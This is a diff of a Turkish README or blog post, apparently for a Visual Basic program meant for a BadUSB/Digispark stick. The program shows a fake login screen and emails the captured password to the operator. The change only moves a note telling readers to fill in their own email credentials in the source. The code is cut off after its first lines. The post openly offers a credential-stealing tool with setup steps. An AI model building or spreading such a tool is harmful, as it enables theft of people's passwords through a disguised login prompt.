@@ -17,10 +17,7 @@ Bu programı BadUSB ile birlikte kullanmak amaçlı oluşturdum ve BadUSB olarak
 <li>sahte login ekranı oluşur</li>
 <li>Son olarak girilen şifre belirlediğimiz mail adresine gönderilir</li>
 
-<blockquote>
-<p><strong>NOT:</strong></p>
-<p>Kaynak kodlar içerisindeki belirttiğim kısımları kendinize göre doldurun sizden sadece mail adresi ve şifresi istenmekte</p>
-</blockquote>
+
 
 Digispark ile ilgli bilgiye ulaşmak için: https://digistump.com/wiki/digispark bu adrese bakın
 
@@ -29,6 +26,11 @@ Sahte görüntü tamamen bir görseldir sadece TextBox ve Button olan kısım ek
 Programı Visual Studio 2013 Ultimate kullanarak hazırladım
 
 <strong>PROGRAMIN KAYNAK KODU</strong>
+
+<blockquote>
+<p><strong>NOT:</strong></p>
+<p>Kaynak kodlar içerisindeki belirttiğim kısımları kendinize göre doldurun sizden sadece mail adresi ve şifresi istenmekte</p>
+</blockquote>
 
 <pre><code>Imports System.Net.Mail
 Public Class Form1
